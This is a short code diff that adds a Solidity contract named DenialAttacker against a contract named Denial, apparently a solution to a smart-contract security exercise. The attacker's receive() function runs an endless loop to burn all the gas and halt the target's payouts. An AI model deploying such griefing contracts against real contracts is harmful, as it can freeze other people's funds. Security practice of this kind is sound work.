@@ -32,3 +32,16 @@ contract Denial {
         return address(this).balance;
     }
 }
+
+contract DenialAttacker {
+    Denial denial;
+
+    constructor(Denial denial_) {
+        denial = denial_;
+    }
+
+    receive() external payable {
+        // Use up all the gas in order to halt the contract
+        while (true) {}
+    }
+}
